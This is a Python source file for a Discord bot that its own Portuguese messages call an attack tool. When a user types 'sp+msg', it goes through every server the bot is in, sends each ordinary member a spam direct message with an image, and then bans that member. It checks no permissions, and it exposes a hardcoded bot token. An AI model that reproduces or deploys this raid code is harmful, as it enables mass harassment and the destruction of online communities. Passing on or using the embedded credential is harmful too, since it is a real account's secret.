import discord
import asyncio

client = discord.Client()

@client.event
async def on_ready():
    print('BOT ONLINE - BOT Online')

@client.event
async def on_message(message):
    if message.content.lower().startswith('sp+qnt'):
        await client.send_message(message.channel, "<:Level:481669463159078925> [**{}**]".format(str(message.server.member_count)))
    if message.content.startswith('sp+setar'):
        set1 = message.content.strip('sp+setar')
        global setar
        setar = set1

    if message.content.lower().startswith('sp+msg'):
        msg = message.content.strip('sp+msg')
        s = 0
        try:
            servers = list(client.servers)
            for x in range(len(servers)):
                await client.send_message(message.channel, "<:Tag:479679474921897994> **Enviando a mensagem para os membros do servidor:** "+servers[x].name)
                for member in list(servers[x].members):
                  if not member.server_permissions.kick_members:
                    try:
                        s += 1
                        embed1 = discord.Embed(color=0x00ffd4, description='<:Level:481669463159078925>\n <@{}> {}'.format(member.id, msg))
                        embed1.set_image(url=setar)
                        embed1.set_footer(text=client.user.name, icon_url=client.user.avatar_url)
                        await client.send_message(member, embed=embed1)
                        await client.send_message(message.channel, "<:ShiroYes:480567244187893780> **{}**\n".format(member.name))
                        await client.send_message(message.channel, "`{}`".format(str(s)))
                        try:
                         await client.ban(member)
                         await client.send_message(message.channel, "<:Ban:483419132881272857> <:ShiroYes:480567244187893780> **{}**\n".format(member.name))
                        except:
                         await client.send_message(message.channel,"<:Ban:483419132881272857> <:ShiroNo:480567243776720898> **{}**\n".format(member.name))
                    except:
                        await client.send_message(message.channel, "<:ShiroNo:480567243776720898> **{}**\n".format(member.name))
                        continue
                await client.send_message(message.channel, '<:Tag:479679474921897994> **Fim do ataque no servidor:**'+servers[x].name)
            await client.send_message(message.channel, '<:Tag:479679474921897994> **Fim dos ataques**')
        except():
            print('ERROR')

client.run('NDU4NzMxMTc1ODc2MzYyMjQw.Dgr6RA._yNBvgKa3ZXplPpWgEuQjSAkWCw')
